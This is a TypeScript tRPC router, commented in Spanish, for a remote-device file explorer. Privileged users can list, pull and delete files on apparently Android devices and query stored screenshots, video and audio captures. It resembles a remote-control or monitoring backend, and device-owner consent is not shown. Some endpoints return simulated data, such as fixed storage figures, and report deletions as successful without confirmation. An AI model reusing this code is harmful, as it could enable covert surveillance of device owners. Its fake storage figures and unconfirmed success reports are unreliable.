import { router, protectedProcedure } from "../_core/trpc";
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { getDb } from "../db";
import { mediaFiles, devices } from "../../drizzle/schema";
import { eq, and } from "drizzle-orm";

/**
 * File Explorer Router
 * Gestiona navegación de archivos del dispositivo
 */
export const fileExplorerRouter = router({
  /**
   * Obtener archivos de un directorio específico
   * Simula estructura de directorios del dispositivo
   */
  getDirectoryContents: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        path: z.string().default("/"),
      })
    )
    .query(async ({ input, ctx }) => {
      try {
        // Verificar que el dispositivo existe
        const db = await getDb();
        if (!db) {
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "Base de datos no disponible",
          });
        }

        const device = await (db as any).query.devices.findFirst({
          where: eq(devices.id, input.deviceId),
        });

        if (!device) {
          throw new TRPCError({
            code: "NOT_FOUND",
            message: "Dispositivo no encontrado",
          });
        }

        // Verificar permisos del usuario
        if (ctx.user.role !== "admin" && ctx.user.role !== "manager") {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "No tienes permisos para acceder a archivos",
          });
        }

        // [ADM FIX] Real-time folder request
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          console.log(`[WebSocket] Requesting directory contents '${input.path}' from device ${input.deviceId}`);
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: "request-files",
            payload: { path: input.path }
          });
        }

        // [PLATINUM PHASE 2] Wait for real WebSocket response via EventBus
        const { eventBus } = await import("../eventBus");
        const eventName = `files-response-${input.deviceId}`;
        
        try {
          const deviceResponse = await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error("Timeout")), 8000);
            eventBus.once(eventName, (data) => {
              clearTimeout(timeout);
              resolve(data);
            });
          });
          
          return {
            path: input.path,
            contents: (deviceResponse as any).contents || [],
            timestamp: new Date(),
          };
        } catch (e) {
          console.warn(`[FileExplorer] Device ${input.deviceId} did not respond in time. Returning empty list.`);
          return {
            path: input.path,
            contents: [],
            timestamp: new Date(),
          };
        }
      } catch (error) {
        console.error("[FileExplorer] Error getting directory contents:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Error al obtener contenido del directorio",
        });
      }
    }),

  /**
   * Obtener archivos multimedia del dispositivo
   */
  getMediaFiles: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        fileType: z.enum(["screenshot", "video", "audio", "photo"]).optional(),
        limit: z.number().default(50),
        offset: z.number().default(0),
      })
    )
    .query(async ({ input, ctx }) => {
      try {
        // Verificar permisos
        if (ctx.user.role !== "admin" && ctx.user.role !== "manager") {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "No tienes permisos para acceder a archivos",
          });
        }

        // Verificar permisos
        const db = await getDb();
        if (!db) {
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "Base de datos no disponible",
          });
        }

        // Construir query
        const whereConditions = [eq(mediaFiles.deviceId, input.deviceId)];
        if (input.fileType) {
          whereConditions.push(eq(mediaFiles.fileType, input.fileType));
        }

        // Obtener archivos
        const files = await (db as any).query.mediaFiles.findMany({
          where: and(...whereConditions),
          limit: input.limit,
          offset: input.offset,
          orderBy: (table: any) => table.timestamp,
        });

        // Obtener total
        const total = await (db as any).query.mediaFiles.findMany({
          where: and(...whereConditions),
        });

        return {
          files: files.map((f: any) => ({
            id: f.id,
            name: f.fileName,
            type: f.fileType,
            size: f.fileSize,
            duration: f.duration,
            url: f.fileUrl,
            timestamp: f.timestamp,
          })),
          total: total.length,
          limit: input.limit,
          offset: input.offset,
        };
      } catch (error) {
        console.error("[FileExplorer] Error getting media files:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Error al obtener archivos multimedia",
        });
      }
    }),

  /**
   * Descargar archivo desde el dispositivo
   */
  downloadFile: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        filePath: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        // Verificar permisos
        if (ctx.user.role !== "admin" && ctx.user.role !== "manager") {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "No tienes permisos para descargar archivos",
          });
        }

        // [ADM FIX] Real-time file download request
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          console.log(`[WebSocket] Requesting file upload '${input.filePath}' from device ${input.deviceId}`);
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: "download-file",
            payload: { path: input.filePath }
          });
        }

        // Simular info de retorno por ahora
        return {
          success: true,
          downloadUrl: `Esperando upload desde dispositivo via WebSockets...`, // Changed to indicate pending status
          fileName: input.filePath.split("/").pop(),
          timestamp: new Date(),
        };
      } catch (error) {
        console.error("[FileExplorer] Error downloading file:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Error al solicitar descarga archivo",
        });
      }
    }),

  /**
   * Eliminar archivo del dispositivo
   */
  deleteFile: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        filePath: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        // Verificar permisos
        if (ctx.user.role !== "admin") {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "Solo administradores pueden eliminar archivos",
          });
        }

        // [ADM FIX] Real-time file deletion
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          console.log(`[WebSocket] Requesting file deletion '${input.filePath}' on device ${input.deviceId}`);
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: "delete-file",
            payload: { path: input.filePath }
          });
        }

        return {
          success: true,
          deletedPath: input.filePath,
          timestamp: new Date(),
        };
      } catch (error) {
        console.error("[FileExplorer] Error deleting file:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Error al eliminar archivo",
        });
      }
    }),

  /**
   * Obtener información de almacenamiento del dispositivo
   */
  getStorageInfo: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input, ctx }) => {
      try {
        // Verificar permisos
        if (ctx.user.role !== "admin" && ctx.user.role !== "manager") {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: "No tienes permisos para acceder a información de almacenamiento",
          });
        }

        // Simular información de almacenamiento
        const totalStorage = 128 * 1024 * 1024 * 1024; // 128 GB
        const usedStorage = Math.floor(totalStorage * 0.65); // 65% usado
        const freeStorage = totalStorage - usedStorage;

        return {
          total: totalStorage,
          used: usedStorage,
          free: freeStorage,
          usagePercentage: Math.round((usedStorage / totalStorage) * 100),
          timestamp: new Date(),
        };
      } catch (error) {
        console.error("[FileExplorer] Error getting storage info:", error);
        throw new TRPCError({
          code: "INTERNAL_SERVER_ERROR",
          message: "Error al obtener información de almacenamiento",
        });
      }
    }),
});

/**
 * Función auxiliar para simular estructura de directorios
 */
function getDirectoryStructure(path: string) {
  const commonDirs: Record<string, any[]> = {
    "/": [
      { name: "DCIM", type: "folder", size: 0, modified: new Date() },
      { name: "Download", type: "folder", size: 0, modified: new Date() },
      { name: "Documents", type: "folder", size: 0, modified: new Date() },
      { name: "Pictures", type: "folder", size: 0, modified: new Date() },
      { name: "Music", type: "folder", size: 0, modified: new Date() },
      { name: "Movies", type: "folder", size: 0, modified: new Date() },
      { name: "Android", type: "folder", size: 0, modified: new Date() },
    ],
    "/DCIM": [
      { name: "Camera", type: "folder", size: 0, modified: new Date() },
      { name: "Screenshots", type: "folder", size: 0, modified: new Date() },
    ],
    "/DCIM/Camera": [
      { name: "IMG_20240101_120000.jpg", type: "file", size: 2048576, modified: new Date() },
      { name: "IMG_20240101_120030.jpg", type: "file", size: 2097152, modified: new Date() },
      { name: "VID_20240101_121000.mp4", type: "file", size: 52428800, modified: new Date() },
    ],
    "/Download": [
      { name: "document.pdf", type: "file", size: 1048576, modified: new Date() },
      { name: "app.apk", type: "file", size: 104857600, modified: new Date() },
    ],
    "/Android": [
      { name: "data", type: "folder", size: 0, modified: new Date() },
      { name: "obb", type: "folder", size: 0, modified: new Date() },
    ],
  };

  return commonDirs[path] || [];
}
